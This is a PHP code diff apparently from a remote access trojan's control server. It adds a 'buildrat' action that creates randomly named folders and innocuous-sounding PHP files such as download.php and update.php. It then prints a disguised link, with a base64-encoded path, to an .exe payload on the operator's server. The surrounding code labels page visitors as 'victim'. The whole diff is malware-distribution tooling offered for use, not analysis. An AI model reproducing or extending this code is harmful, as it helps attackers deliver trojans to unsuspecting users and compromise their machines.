@@ -24,6 +24,7 @@ $actioncontent5 = $_GET["actioncontent5"];                                      
 $victim = $_SERVER['REMOTE_ADDR'];                                                           // victim return page visitor ip (on used occurence the victim IP)  
 $actionid = randomstring(5);                                                                 // actionid is used when sending a message in chatbox(check if message is not the same)
 $date = date("[H:i:s d-m-Y]");                                                               // date is here in case i need it
+$servip = $_SERVER['SERVER_ADDR'];                                                           // VPS IP used when building the rat
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 
@@ -182,6 +183,28 @@ cache_set($list . "adminchat" , ""); cache_set($list . "clientchat" , ""); cache
 //        file_put_contents($loc , $content . "<br>", FILE_APPEND);}
 //
 /////////////////////////////////////////////////////////
+
+
+
+// BUILDER FILE CREATOR
+if ($action == "buildrat") {
+$foldername = array("videourl" ,"uploads", "profiles" , "readme" , "versions", "updates");
+$phpfiles = array("download.php" , "profile.php", "scanner.php", "install.php" , "update.php" , "images.php" , "browse.php" , "logout.php");
+$extensiontype = array("?phpid=" , "?fileid=", "?executable=", "?filename=" ,"?id=", "?imagepath=", "?version=","?number=" , "?date=" , "?password=");
+$selectedfoldername = $foldername[mt_rand(0, count($foldername) - 1)];
+$selectedphpfile = $phpfiles[mt_rand(0, count($phpfiles) - 1)];
+$selectedextensiontype = $extensiontype[mt_rand(0, count($extensiontype) - 1)];
+if (!is_dir("$selectedfoldername")) { mkdir("$selectedfoldername", 0777); chmod("$selectedfoldername", 0777);}
+$template = file_get_contents("download.php");
+if (!file_exists("$selectedfoldername/$selectedphpfile")) { file_put_contents("$selectedfoldername/$selectedphpfile" , $template);}
+$totalpath = "$selectedfoldername/$selectedphpfile$selectedextensiontype";
+$fpath = base64_encode("files/" . randomstring(10) . ".exe");
+echo "http://" . $servip . "/RATZ/" . $totalpath . $fpath;
+}
+
+
+
+
 
 
 
